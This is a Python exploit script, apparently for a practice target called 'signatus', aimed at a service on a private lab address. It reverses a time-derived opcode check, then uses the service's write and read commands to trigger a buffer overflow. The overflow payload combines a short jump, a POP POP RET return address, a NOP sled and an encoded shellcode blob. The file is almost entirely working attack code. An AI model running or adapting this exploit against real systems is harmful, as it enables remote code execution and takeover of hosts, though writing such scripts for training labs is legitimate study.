# https://github.com/bmdyy/signatus

import socket
from struct import pack
import time

server = "192.168.56.108"
port = 9999


def timeCalc():
    time1 = round(time.time())
    print("Unix time = {}".format(time1))
    # time1 = 1661865597  # comments below are calculations based on this value
    time1 = str(time1)[:9]  # remove last digit
    time1 = int(time1)
    esi = hex(time1)[7:]  # 3f
    eax = int(esi, 16) * int(esi, 16)  # f81
    edx = int(esi, 16) * eax  # 3d0bf
    ecx = edx * int(esi, 16)  # f05f01
    edx = edx & 0xFFFFFF00  # 3d000
    edx = edx << 4  # 3d0000
    edx = edx | eax  # 3d0f81
    edx = edx & 0xFFFFFFF0  # 3d0f80
    ecx = ecx & 0xFFFFF000  # f05000
    ecx = ecx << 8  # f0500000
    edx = edx | ecx  # f07d0f80
    edx = edx << 4  # f07d0f800
    if len(hex(edx)[2:]) > 7:
        edx = int("0x" + hex(edx)[-8:], 16)
    edx = edx | int(esi, 16)
    edx = edx ^ 0x74829726
    print("Final calculation is : {}".format(hex(edx)))
    return edx


def writeFile(server, port, buffer):

    try:
        server = server
        port = port

        buf = pack("<L", opCode)  # OPCODE
        buf += pack("<L", 0x1)  # 60AE141D 2nd recv call
        buf += buffer  # 60AE111F 3rd recv call - write content to file

        print("\nWriting to file...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        s.close()

    except socket.error:
        print("Could not connect!")


def readFile(server, port):

    try:
        server = server
        port = port

        buf = pack("<L", opCode)  # OPCODE
        buf += pack("<L", 0x2)  # 60AE141D 2nd recv call

        print("\nReading file and triggering overflow...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        s.close()
        print("\nDone!")

    except socket.error:
        print("Could not connect!")


def emptyFile(server, port):

    try:
        server = server
        port = port

        buf = pack("<L", opCode)  # OPCODE
        buf += pack("<L", 0x3)  # 60AE141D 2nd recv call
        buf += b""

        print("\nEmptying file ...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server, port))
        s.send(buf)
        s.close()

    except socket.error:
        print("Could not connect!")


buffer1 = b"A" * 0x800
buffer2 = b"A" * 129
buffer2 += b"\xeb\x05\x90\x90"  # Short Jump 0x7
buffer2 += pack("<I", 0x60ae1091)  # EIP - POP ECX, POP ECX, RET
buffer2 += b"\x90" * 0x30

# Shellcode
buffer2 += b"\xdb\xca\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x52\xbb"
buffer2 += b"\x83\x75\xb9\x90\x83\xe8\xfc\x31\x58\x13\x03\xdb"
buffer2 += b"\x66\x5b\x65\x27\x60\x19\x86\xd7\x71\x7e\x0e\x32"
buffer2 += b"\x40\xbe\x74\x37\xf3\x0e\xfe\x15\xf8\xe5\x52\x8d"
buffer2 += b"\x8b\x88\x7a\xa2\x3c\x26\x5d\x8d\xbd\x1b\x9d\x8c"
buffer2 += b"\x3d\x66\xf2\x6e\x7f\xa9\x07\x6f\xb8\xd4\xea\x3d"
buffer2 += b"\x11\x92\x59\xd1\x16\xee\x61\x5a\x64\xfe\xe1\xbf"
buffer2 += b"\x3d\x01\xc3\x6e\x35\x58\xc3\x91\x9a\xd0\x4a\x89"
buffer2 += b"\xff\xdd\x05\x22\xcb\xaa\x97\xe2\x05\x52\x3b\xcb"
buffer2 += b"\xa9\xa1\x45\x0c\x0d\x5a\x30\x64\x6d\xe7\x43\xb3"
buffer2 += b"\x0f\x33\xc1\x27\xb7\xb0\x71\x83\x49\x14\xe7\x40"
buffer2 += b"\x45\xd1\x63\x0e\x4a\xe4\xa0\x25\x76\x6d\x47\xe9"
buffer2 += b"\xfe\x35\x6c\x2d\x5a\xed\x0d\x74\x06\x40\x31\x66"
buffer2 += b"\xe9\x3d\x97\xed\x04\x29\xaa\xac\x40\x9e\x87\x4e"
buffer2 += b"\x91\x88\x90\x3d\xa3\x17\x0b\xa9\x8f\xd0\x95\x2e"
buffer2 += b"\xef\xca\x62\xa0\x0e\xf5\x92\xe9\xd4\xa1\xc2\x81"
buffer2 += b"\xfd\xc9\x88\x51\x01\x1c\x1e\x01\xad\xcf\xdf\xf1"
buffer2 += b"\x0d\xa0\xb7\x1b\x82\x9f\xa8\x24\x48\x88\x43\xdf"
buffer2 += b"\x1b\x77\x3b\xe7\xda\x1f\x3e\x17\xdc\x64\xb7\xf1"
buffer2 += b"\xb4\x8a\x9e\xaa\x20\x32\xbb\x20\xd0\xbb\x11\x4d"
buffer2 += b"\xd2\x30\x96\xb2\x9d\xb0\xd3\xa0\x4a\x31\xae\x9a"
buffer2 += b"\xdd\x4e\x04\xb2\x82\xdd\xc3\x42\xcc\xfd\x5b\x15"
buffer2 += b"\x99\x30\x92\xf3\x37\x6a\x0c\xe1\xc5\xea\x77\xa1"
buffer2 += b"\x11\xcf\x76\x28\xd7\x6b\x5d\x3a\x21\x73\xd9\x6e"
buffer2 += b"\xfd\x22\xb7\xd8\xbb\x9c\x79\xb2\x15\x72\xd0\x52"
buffer2 += b"\xe3\xb8\xe3\x24\xec\x94\x95\xc8\x5d\x41\xe0\xf7"
buffer2 += b"\x52\x05\xe4\x80\x8e\xb5\x0b\x5b\x0b\xc5\x41\xc1"
buffer2 += b"\x3a\x4e\x0c\x90\x7e\x13\xaf\x4f\xbc\x2a\x2c\x65"
buffer2 += b"\x3d\xc9\x2c\x0c\x38\x95\xea\xfd\x30\x86\x9e\x01"
buffer2 += b"\xe6\xa7\x8a"


opCode = timeCalc()

emptyFile(server, port)

writeFile(server, port, buffer1)  # first write 0x800 bytes into log

writeFile(server, port, buffer2)  # second write 0xfff bytes into log

readFile(server, port)
